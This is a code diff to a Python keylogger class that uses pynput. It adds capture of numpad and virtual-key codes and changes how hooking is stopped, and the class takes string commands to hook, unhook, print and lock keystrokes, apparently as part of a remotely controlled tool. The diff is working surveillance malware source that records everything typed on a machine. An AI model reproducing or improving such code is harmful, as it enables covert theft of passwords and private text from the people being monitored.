@@ -1,4 +1,4 @@
-from pynput.keyboard import Listener, Key
+from pynput.keyboard import KeyCode, Listener, Key
 import keyboard
 import time
 
@@ -17,7 +17,7 @@ class KeyLogger:
             if cmd == "keystroke,hook":
                 self.hook_key()
             elif cmd == "keystroke,unhook":
-                self.unhook_key()
+                KeyLogger.unhook_key()
             elif cmd == "keystroke,print":
                 self.print_keys()
             elif cmd == "keystroke,lock":
@@ -38,10 +38,18 @@ class KeyLogger:
             else:
                 KeyLogger.keys += '<' + str(key) + '>'
         else:
-            if ord(key.char) < 32:
-                KeyLogger.keys += chr(ord(key.char) + 96)
+
+            if key.char == None:
+                if 96 <= key.vk <= 105:
+                    KeyLogger.keys += "<numpad:" + chr(key.vk - 48) + ">"
+                else:
+                    print(key.vk, chr(key.vk))
+                    KeyLogger.keys += chr(key.vk)
             else:
-                KeyLogger.keys += key.char
+                if ord(key.char) < 32: 
+                    KeyLogger.keys += chr(key.vk)
+                else:
+                    KeyLogger.keys += key.char
     
     def hook_key(self): 
         if KeyLogger.is_hooking: return
@@ -50,7 +58,8 @@ class KeyLogger:
         # KeyLogger.listener.join()
         KeyLogger.is_hooking = True
 
-    def unhook_key(self):
+    @staticmethod
+    def unhook_key():
         if not KeyLogger.is_hooking: return
         KeyLogger.listener.stop()
         KeyLogger.is_hooking = False
